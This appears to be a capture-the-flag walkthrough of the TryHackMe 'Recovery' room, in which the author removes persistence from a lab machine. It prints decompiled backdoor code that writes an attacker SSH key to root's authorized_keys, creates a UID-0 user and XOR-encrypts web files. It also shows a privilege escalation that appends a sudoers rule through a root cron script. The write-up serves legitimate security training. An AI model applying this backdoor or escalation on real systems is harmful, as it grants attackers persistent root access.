Hi, here is how to successfully complete the machine https://tryhackme.com/room/recovery
![recovery](https://github.com/user-attachments/assets/6220a169-2327-486d-bcbe-99c0d5f5dc44)
<br><br><br>

As usual, I start by scanning the target machine with nmap, we see 3 open ports

I will only be using port 22 and 1337 to get the flags as we go through the machine.
<pre><code>22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 55:17:c1:d4:97:ba:8d:82:b9:60:81:39:e4:aa:1e:e8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqaXDoAAvwHBvNhrHfjZaxCgLbQAImpPRiPxxetRqPQYVPusw2lV6HPV1j2ymgdsaA7bNP8jroSq54c2mVLyYVYwbdUscYuLMj/RflPxHx/18J2LF0FnhyRsX8iszNqQ+BqDQ74O2hyN/Cqbwy8pm6i75QRIBlyFRzFwihqSqCDp9OO75Y9wr2+iQX8yzL7CJjnS5w+vEdnGsf88Mzs/NZxB2ZHoDf3lw8uMo0iHg23GfPntVilr01AP6szDOHIMlMMk6pMqkU7MrXvJz+Ij+MP8b1+5T0uBB4MgtrUyQLXyRZGX4M30YGdR+jnfAjIKEjAEqrSyotr+l+hLEgUNHT
|   256 8d:f5:4b:ab:23:ed:a3:c0:e9:ca:90:e9:80:be:14:44 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCjzHLHSekU/G6uRjXbHIsERaRTzJ+a1lVwvIXkLoaqhlHIM616JxWkaUD0CxzLjrnSjxKsjI1YXcrHYFNd2rys=
|   256 3e:ae:91:86:81:12:04:e4:70:90:b1:40:ef:b7:f1:b6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHR259lx5M/24wvX1dnbS1ehHzmK4sr1B7aZqsfIesOB
80/tcp   open  http    syn-ack ttl 62 Apache httpd 2.4.43 ((Unix))
| http-methods: 
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.43 (Unix)
|_http-title: Site doesn't have a title (text/html).
1337/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
|_http-title: Help Alex!
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
<br><br><br>

# First flag (Falg 0)

the first thing I find when accessing the machine is what alex tells me, the virus causes the message “YOU DIDN'T SAY THE MAGIC WORD!” to be displayed constantly on the screen, and after a while I am kicked out of the machine.

there are two options, press ctrl+c and wait a while for the message to stop appearing but it doesn't always work for me and since I was kicked off the machine a couple of times it became tedious.
<pre><code>ssh alex@10.10.216.36
The authenticity of host '10.10.216.36 (10.10.216.36)' can't be established.
ED25519 key fingerprint is SHA256:I4JOO0i86jz8ik99nUU9JfcBP/8CySItEru9FlYGRas.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:42: 10.10.165.220
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.216.36' (ED25519) to the list of known hosts.
alex@10.10.216.36's password: 
YOU DIDN'T SAY THE MAGIC WORD!
YOU DIDN'T SAY THE MAGIC WORD!
YOU DIDN'T SAY THE MAGIC WORD!
YOU DIDN'T SAY THE MAGIC WORD!
YOU DIDN'T SAY THE MAGIC WORD!
YOU DIDN'T SAY THE MAGIC WORD!
YOU DIDN'T SAY THE MAGIC WORD!
YOU DIDN'T SAY THE MAGIC WORD!
YOU DIDN'T SAY THE MAGIC WORD!
YOU DIDN'T SAY THE MAGIC WORD!
YOU DIDN'T SAY THE MAGIC WORD!
YOU DIDN'T SAY THE MAGIC WORD!
YOU DIDN'T SAY THE MAGIC WORD!
YOU DIDN'T SAY THE MAGIC WORD!
YOU DIDN'T SAY THE MAGIC WORD!
</code></pre>
<br><br><br>

this is the second option, force the assignment of a pty, this way I am not only getting rid of the message, but also avoid being kicked off the machine.

The .bashrc file is a configuration script that runs automatically when you start a new Bash session, the culprit for the looping message
<pre><code>ssh alex@10.10.216.36 -t "/bin/sh"
alex@10.10.216.36's password: 
$ ls -la
total 72
drwxr-xr-x 1 alex alex  4096 Feb 11 23:16 .
drwxr-xr-x 1 root root  4096 Jun 17  2020 ..
-rw-r--r-- 1 alex alex   220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 alex alex  3527 Feb 11 23:16 .bashrc
drwxr-xr-x 3 alex alex  4096 Feb 11 23:16 .local
-rw-r--r-- 1 alex alex   807 Apr 18  2019 .profile
-rwxrwxr-x 1 root root 37344 Jun 12  2020 fixutil</code></pre>
<br><br><br>

when I open .bashrc I can see in the last line the instruction of the looped message, removing it I get the first flag
<pre><code>$ cat .bashrc   
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
#[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
	# We have color support; assume it's compliant with Ecma-48
	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
	# a case would tend to support setf rather than setaf.)
	color_prompt=yes
    else
	color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    #alias grep='grep --color=auto'
    #alias fgrep='fgrep --color=auto'
    #alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
#alias ll='ls -l'
#alias la='ls -A'
#alias l='ls -CF'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi


while :; do echo "YOU DIDN'T SAY THE MAGIC WORD!"; done &</code></pre>
<br><br><br>

# Second flag (flag 1)

I try to switch to bash to be more comfortable, but the “exit” command keeps being executed.

Most likely it is a cron job.
<pre><code>$ /bin/bash
alex@recoveryserver:~$ exit</code></pre>
<br><br><br>

The files inside /etc/cron.d/ are part of the configuration of cron, the task scheduling system in Linux

/etc/cron.d/ It is a special directory where you can define scheduled tasks without having to modify each user's crontab. Each file within /etc/cron.d/ contains cron rules and behaves as an extension of the system's global crontab
<pre><code>$ cd /etc/cron.d
$ ls -la
total 16
drwxr-xr-x 1 root root 4096 Jun 17  2020 .
drwxr-xr-x 1 root root 4096 Jun 17  2020 ..
-rw-r--r-- 1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x 1 root root   61 Jun 17  2020 evil</code></pre>
<br><br><br>

every minute there is a script being executed as root
<pre><code>$ cat evil

* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog</code></pre>
<br><br><br>

This script searches for and kills all running Bash processes. First, it uses ps aux to list the processes, then grep bash to filter out only those containing “bash”, excludes the grep command itself with grep -v grep, and extracts the PIDs with awk '{print $2}'. Finally, use a for loop to execute kill on each PID. 
<pre><code>$ cd /opt
$ ls
brilliant_script.sh
$ cat brilliant_script.sh
#!/bin/sh

for i in $(ps aux | grep bash | grep -v grep | awk '{print $2}'); do kill $i; done;
$ </code></pre>
<br><br><br>

to get this flag is simple, we just need to delete this instruction from the script
<pre><code>$ nano brilliant_script.sh</code></pre>
<br><br><br>

# Third  Flag (flag 2)

now I can switch to /bin/bash without any problem
<pre><code>$ /bin/bash
alex@recoveryserver:/opt$</code></pre>
<br><br><br>

previously I saw that the brilliant_script.sh script runs with root privileges every minute, to get full command execution I will make it modify the file /etc/sudoers

This gives alex unrestricted access to the system. As a result, alex can execute any command on the server without limitations.
<pre><code>$ cat brilliant_script.sh
#!/bin/sh

echo "alex ALL=(ALL:ALL) ALL" >> /etc/sudoers;
$ sudo -l
Matching Defaults entries for alex on recoveryserver:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User alex may run the following commands on recoveryserver:
    (ALL : ALL) ALL</code></pre>
<br><br><br>

the next thing I did was to get the binary of fixutils and the library it uses, liblogging.so, to my machine.
<pre><code>scp alex@10.10.18.216:/lib/x86_64-linux-gnu/liblogging.so  /home/maxi/CTF/try\ hack\ me/medium/recovery/
alex@10.10.18.216's password: 
liblogging.so                                                                      100%   23KB  27.6KB/s   00:00</code></pre>
<br><br><br>


![2025-02-11_20-36](https://github.com/user-attachments/assets/629d6011-25c4-4111-81cf-0d4536d54457)
<br><br><br>

I will be explaining everything that the code does.

first, the code appears to be designed to create a backdoor into the system by inserting an SSH key into the authorized_keys file, which could allow an attacker remote access to the machine with root privileges. In addition, the movement of a malicious file suggests an intent to alter legitimate system behavior or execute additional code covertly, I will remove this backdoor.
<pre><code>
void LogIncorrectAttempt(char *attempt)

{
  time_t tVar1;
  FILE *pFVar2;
  char *attempt-local;
  char *ssh_key;
  FILE *authorized_keys;
  FILE *script_f;
  FILE *cron_f;
  
  system("/bin/mv /tmp/logging.so /lib/x86_64-linux-gnu/oldliblogging.so");
  tVar1 = time((time_t *)0x0);
  srand((uint)tVar1);
  pFVar2 = fopen("/root/.ssh/authorized_keys","w");
  fprintf(pFVar2,"%s\n",
          "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4U9gOtekRWtwKBl3+ysB5WfybPSi/rpvDDfvRNZ+BL81mQYTMP bY3bD6u2eYYXfWMK6k3XsILBizVqCqQVNZeyUj5x2FFEZ0R+HmxXQkBi+yNMYoJYgHQyngIezdBsparH62RUTfmUbw GlT0kxqnnZQsJbXnUCspo0zOhl8tK4qr8uy2PAG7QbqzL/epfRPjBn4f3CWV+EwkkkE9XLpJ+SHWPl8JSdiD/gTIMd 0P9TD1Ig5w6F0f4yeGxIVIjxrA4MCHMmo1U9vsIkThfLq80tWp9VzwHjaev9jnTFg+bZnTxIoT4+Q2gLV124qdqzw5 4x9AmYfoOfH9tBwr0+pJNWi1CtGo1YUaHeQsA8fska7fHeS6czjVr6Y76QiWqq44q/BzdQ9klTEkNSs+2sQs9csUyb WsXumipViSUla63cLnkfFr3D9nzDbFHek6OEk+ZLyp8YEaghHMfB6IFhu09w5cPZApTngxyzJU7CgwiccZtXURnBmK V72rFO6ISrus= root@recovery"
         );
  fclose(pFVar2);
  system("/usr/sbin/useradd --non-unique -u 0 -g 0 security 2>/dev/null");
  system(
        "/bin/echo \'security:$6$he6jYubzsBX1d7yv$sD49N/rXD5NQT.uoJhF7libv6HLc0/EZOqZjcvbXDoua44ZP3V rUcicSnlmvWwAFTqHflivo5vmYjKR13gZci/\' | /usr/sbin/chpasswd -e"
        );
  XOREncryptWebFiles();
  pFVar2 = fopen("/opt/brilliant_script.sh","w");
  fwrite("#!/bin/sh\n\nfor i in $(ps aux | grep bash | grep -v grep | awk \'{print $2}\'); do kill $ i; done;\n"
         ,1,0x5f,pFVar2);
  fclose(pFVar2);
  pFVar2 = fopen("/etc/cron.d/evil","w");
  fwrite("\n* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog\n\n",1,0x3d,pFVar2);
  fclose(pFVar2);
  chmod("/opt/brilliant_script.sh",0x1ff);
  chmod("/etc/cron.d/evil",0x1ed);
  return;
}

</code></pre>
<br><br><br>

once eliminated I got the flag
<pre><code>alex@recoveryserver:/lib/x86_64-linux-gnu$ sudo mv oldliblogging.so liblogging.so</code></pre>
<br><br><br>

# Fourth flag (flag 3)

Going back to the previous code, the next thing it does is to give an attacker the ability to access the system as root via SSH. This is a way to create a backdoor into the system, because by adding your SSH key to the authorized_keys file, the attacker can remotely connect to the system without authenticating with a password.
<pre><code>pFVar2 = fopen("/root/.ssh/authorized_keys","w");
  fprintf(pFVar2,"%s\n",
          "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4U9gOtekRWtwKBl3+ysB5WfybPSi/rpvDDfvRNZ+BL81mQYTMP bY3bD6u2eYYXfWMK6k3XsILBizVqCqQVNZeyUj5x2FFEZ0R+HmxXQkBi+yNMYoJYgHQyngIezdBsparH62RUTfmUbw GlT0kxqnnZQsJbXnUCspo0zOhl8tK4qr8uy2PAG7QbqzL/epfRPjBn4f3CWV+EwkkkE9XLpJ+SHWPl8JSdiD/gTIMd 0P9TD1Ig5w6F0f4yeGxIVIjxrA4MCHMmo1U9vsIkThfLq80tWp9VzwHjaev9jnTFg+bZnTxIoT4+Q2gLV124qdqzw5 4x9AmYfoOfH9tBwr0+pJNWi1CtGo1YUaHeQsA8fska7fHeS6czjVr6Y76QiWqq44q/BzdQ9klTEkNSs+2sQs9csUyb WsXumipViSUla63cLnkfFr3D9nzDbFHek6OEk+ZLyp8YEaghHMfB6IFhu09w5cPZApTngxyzJU7CgwiccZtXURnBmK V72rFO6ISrus= root@recovery"
         );
  fclose(pFVar2);</code></pre>
<br><br><br>

I delete the authorized_keys file located in the /root/.ssh/ directory. This file is crucial for SSH authentication, as it contains the authorized public keys to access the system root account remotely, without the need for a password.

once removed I get the flag
<pre><code>alex@recoveryserver:/lib/x86_64-linux-gnu$ sudo rm /root/.ssh/authorized_keys</code></pre>
<br><br><br>

# Fifth flag (flag 4)

This code creates a new user named security with UID 0 and GID 0, which gives it the same privileges as root, allowing it full control of the system. It then sets a predefined, encrypted password for this user using the chpasswd -e command, allowing an attacker unrestricted access to the system as long as he knows the password. This is a backdoor mechanism that facilitates persistent and unauthorized access, allowing privilege escalation. To mitigate this risk, it is essential to remove the malicious user (userdel -r security), check /etc/passwd for suspicious accounts and scan authentication logs for unusual activity.
<pre><code> fclose(pFVar2);
  system("/usr/sbin/useradd --non-unique -u 0 -g 0 security 2>/dev/null");
  system(
        "/bin/echo \'security:$6$he6jYubzsBX1d7yv$sD49N/rXD5NQT.uoJhF7libv6HLc0/EZOqZjcvbXDoua44ZP3V rUcicSnlmvWwAFTqHflivo5vmYjKR13gZci/\' | /usr/sbin/chpasswd -e"
        );</code></pre>
<br><br><br>

remove this user from the following files, so I get the new flag
<pre><code>alex@recoveryserver:/etc$ sudo nano passwd
alex@recoveryserver:/etc$ sudo nano shadow</code></pre>
<br><br><br>

# Sixth flag (flag 5)

Reading the libloggin.so code, I found this function called “XOREncryptWebFiles”, This code implements a function to encrypt web files using an XOR cipher, generating a random 16-character key and storing it in the hidden file /opt/.fixutil/backup.txt. First, it creates the key with rand_string(), checks if the key directory exists and, if not, creates it with restrictive permissions. Then, it records the key in backup.txt for possible retrieval and collects the web files using GetWebFiles(). suggests that the web files will be encrypted using the generated key. If backup.txt is accessible, it allows retrieving the key and decrypting the files, which may be useful for recovery.
![2025-02-11_20-46](https://github.com/user-attachments/assets/420160b3-979a-47ce-82c5-6adec0f43982)
<br><br><br>

<pre><code>
/* WARNING: Unknown calling convention */

void XOREncryptWebFiles(void)

{
  int iVar1;
  char *str;
  FILE *__stream;
  char **webfiles;
  long lVar2;
  stat *psVar3;
  long in_FS_OFFSET;
  byte bVar4;
  int i;
  int amnt_webfiles;
  char *encryption_key;
  FILE *encryption_file;
  char **webfile_names;
  stat stat_res;
  long local_10;
  
  bVar4 = 0;
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  str = (char *)malloc(0x11);
  if (str == (char *)0x0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  rand_string(str,0x10);
  psVar3 = 
  for (lVar2 = 0x12; lVar2 != 0; lVar2 = lVar2 + -1) {
    psVar3->st_dev = 0;
    psVar3 = (stat *)((long)psVar3 + (ulong)bVar4 * -0x10 + 8);
  }
  iVar1 = stat(encryption_key_dir,(stat *)
  if (iVar1 == -1) {
    mkdir(encryption_key_dir,0x1c0);
  }
  __stream = fopen("/opt/.fixutil/backup.txt","a");
  fprintf(__stream,"%s\n",str);
  fclose(__stream);
  webfiles = (char **)malloc(8);
  if (webfiles == (char **)0x0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  iVar1 = GetWebFiles(webfiles,8);
  for (i = 0; i < iVar1
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;</code></pre>
<br><br><br>

we have access to the key, which means we can decrypt alex's files
<pre><code>alex@recoveryserver:/etc$ sudo cat /opt/.fixutil/backup.txt
AdsipPewFlfkmll</code></pre>
<br><br><br>

thanks to ghidra I can know that the GetWebFiles function uses a hard-coded variable "web_location" that points to /usr/local/apache2/htdocs

Inside this directory are the encrypted files
<pre><code>alex@recoveryserver:/etc$ cd /usr/local/apache2/htdocs
alex@recoveryserver:/usr/local/apache2/htdocs$ ls
index.html  reallyimportant.txt  todo.html</code></pre>
<br><br><br>

indeed, they are encrypted
<pre><code>alex@recoveryserver:/usr/local/apache2/htdocs$ cat reallyimportant.txt 

P$2L$
I#E#
L,1
   hf/K$D8
          !L
	/Sp
fS         }L/K
  1W2K4P?W*	</code></pre>
<br><br><br>

I previously discovered that the files were being encrypted with XOR, and I already have the key to decrypt them.

I am going to download the files to my machine and decrypt them.
<pre><code>scp alex@10.10.18.216:/usr/local/apache2/htdocs/index.html  CTF/try\ hack\ me/medium/recovery/
alex@10.10.18.216's password: 
index.html                                                                         100%  997     1.7KB/s   00:00</code></pre>
<br><br><br>

you can choose your preferred method to decrypt the files, I used a python script.

once you verify that the file was recovered repeat the process with all other files.
<pre><code>> python3 deco.py reallyimportant.txt 
> cat reallyimportant.txt 
This text document is really important.
I hope nothing happens to it; I can't bear the thought of loosing it</code></pre>
<br><br><br>

all that remains is to change the contents of the encrypted files and get the last flag.
<pre><code>alex@recoveryserver:/usr/local/apache2/htdocs$ sudo nano reallyimportant.txt 
alex@recoveryserver:/usr/local/apache2/htdocs$ sudo nano todo.html 
alex@recoveryserver:/usr/local/apache2/htdocs$ sudo nano index.html</code></pre>
<br><br><br>

![2025-02-11_20-56](https://github.com/user-attachments/assets/f416848d-9359-4826-b425-a8b3f14374aa)

<br><br><br>

